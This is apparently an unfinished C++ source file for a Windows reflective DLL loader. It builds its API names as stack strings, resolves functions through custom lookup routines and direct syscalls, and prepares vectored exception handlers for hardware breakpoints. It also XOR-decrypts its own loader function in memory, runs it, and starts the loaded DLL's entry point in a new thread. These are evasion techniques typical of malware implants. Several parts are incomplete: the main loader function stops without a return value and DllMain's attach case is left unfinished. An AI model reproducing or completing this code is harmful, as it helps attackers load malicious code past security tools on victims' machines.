#include "pch.h"
#include "headers.h"
#include "syscalls.h"
#include "misc.h"

EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
{
	//PE HEADERS VARS
	PIMAGE_DOS_HEADER	pImgDosHdr = NULL;
	PIMAGE_NT_HEADERS	pImgNtHdrs = NULL;
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = { 0 };
	IMAGE_FILE_HEADER ImgFileHdr = { 0 };
	PIMAGE_SECTION_HEADER* peSections = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImgImpDesc = NULL;
	PIMAGE_THUNK_DATA64 pOriginalFirstThunk = NULL;
	PIMAGE_THUNK_DATA64 pFirstThunk = NULL;
	PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
	PIMAGE_BASE_RELOCATION pImgRelocation = NULL;
	PBASE_RELOCATION_ENTRY pRelocEntry = NULL;
	PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFunctionEntry = NULL;
	PIMAGE_TLS_DIRECTORY pImgTlsDirectory = NULL;
	PIMAGE_TLS_CALLBACK* arrayOfCallbacks = NULL;



	//fix IAT vars
	HMODULE dll = NULL;
	FARPROC funcAddress = NULL;
	int ordinal = 0;


	//base relocation vars
	ULONG_PTR delta = NULL;
	int entriesCount;

	//fix Memory Protection variables
	DWORD dwProtection = 0x00;


	//locate DLL in memory
	PDLL_HEADER pDllHeader = NULL;
	ULONG_PTR dllBaseAddress = NULL;

	//new PE in memory and memory to free once loaded
	PBYTE pebase = NULL;
	PBYTE toFree = NULL;

	//function prototpyes
	fnLoadLibraryA func_LoadLibraryA = NULL; //to fix the IAT
	fnRtlAddFunctionTable func_RtlAddFunctionTable = NULL;
	fnLoadLibraryExA func_LoadLibraryExA = NULL;//to load sac dll without resolving imports

	//stack strings for PIC
	WCHAR str_Kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR str_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR str_user32[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR str_RtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e', '\0' };
	CHAR str_LoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
	CHAR str_LoadLibraryExA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
	CHAR str_GetProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };


	//stack strings and variables for HBP
	CHAR str_AddVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
	CHAR str_RemoveVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
	PVOID zwCloseAddress = NULL;
	PVOID NtMapViewOfSectionAddress = NULL;
	PVOID NtCreateSectionAddress = NULL;
	CHAR str_ZwClose[] = { 'Z','w','C','l','o','s','e','\0' };
	CHAR str_NtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
	CHAR str_NtCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };


	//NT status variable for syscall return code
	NTSTATUS STATUS = 0x00;

	HMODULE hm_kernel32 = GMHR(str_Kernel32);

	fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR(hm_kernel32, str_AddVectoredExceptionHandler);
	fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR(hm_kernel32, str_RemoveVectoredExceptionHandler);

	if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
		return FALSE;
	if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
		return FALSE;
	if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
		return FALSE;

	SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
	retrieve_zw_func_s(GMHR(str_ntdll), zw_func_s);





}

EXTERN_DLL_EXPORT bool _123321_asdf21425()
{
	WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR str_create_thread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };

	fnCreateThread fn_create_thread = NULL;
	if ((fn_create_thread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
		return FALSE;

	fnDllMain p_dll_main = NULL;
	PBYTE pebase = NULL;
	PIMAGE_DOS_HEADER p_img_dos_hdr = NULL;
	PIMAGE_NT_HEADERS p_img_nt_hdrs = NULL;
	PDLL_HEADER p_dll_header = NULL;
	ULONG_PTR dll_base_addr = NULL;

	// lea rax, [rip + 0x0]
	dll_base_addr = (ULONG_PTR)_123321_asdf21425;

	while (TRUE)
	{

		p_dll_header = (PDLL_HEADER)dll_base_addr;

		if (p_dll_header->header == 0x44434241) {
			p_img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
			if (p_img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
			{
				p_img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + p_img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));

				if (p_img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
				{
					break;
				}
			}
		}

		dll_base_addr--;

	}

	if (!dll_base_addr)
		return FALSE;

	PBYTE reflective_addr = NULL;
	BYTE KEY[4] = {
		(BYTE)(p_dll_header->key & 0xFF),
		(BYTE)((p_dll_header->key >> 8) & 0xFF),
		(BYTE)((p_dll_header->key >> 16) & 0xFF),
		(BYTE)((p_dll_header->key >> 24) & 0xFF),
	};

	reflective_addr = (PBYTE)ReflectiveFunction;

	// decrypting the reflective function
	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
	{
		//if (j >= sizeof(p_dll_header->key))
		//{
		//	j = 0;
		//}
		reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
	}

	pebase = ReflectiveFunction();

	// re-encrypting the reflective function
	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
	{
		//if (j >= sizeof(p_dll_header->key))
		//{
		//	j = 0;
		//}
		reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
	}

	p_dll_header->key = { 0 };

	p_dll_main = (fnDllMain)(pebase + p_img_nt_hdrs->OptionalHeader.AddressOfEntryPoint);

	HANDLE h_thread = fn_create_thread(
		NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
		(LPVOID)p_dll_main, 0, NULL
	);

	if (h_thread == NULL)
		return FALSE;

	return TRUE;

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        PBYTE old_memory = NULL;

        // even if unmapped it's in the PEB
        PBYTE self_base = (PBYTE)GetModuleHandleA("SRH.dll");

        // retrieve the information left from the reflective loader
        PHANDLE p_handle = (PHANDLE)self_base;
        HANDLE sac_dll = *p_handle;



    }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

